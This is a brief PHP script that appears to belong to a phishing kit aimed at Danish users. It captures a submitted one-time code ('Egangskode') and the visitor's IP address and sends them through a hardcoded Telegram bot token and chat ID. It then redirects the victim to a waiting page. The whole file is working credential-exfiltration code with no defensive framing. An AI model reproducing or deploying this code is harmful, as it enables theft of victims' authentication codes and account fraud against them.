<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------Egangskode------------------------------\n";
$message .= "Egangskode         : ".$_POST['fs1']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------Egangskode--------------------------------\n";


file_get_contents("https://api.telegram.org/bot7972283517:AAEljr1HUwZFT5_J_ujwYtS_8EnVv0UYPJ4
/sendMessage?chat_id=-4969805509 &text=" . urlencode($message)."" );

header("Location: ../wait.php");
?>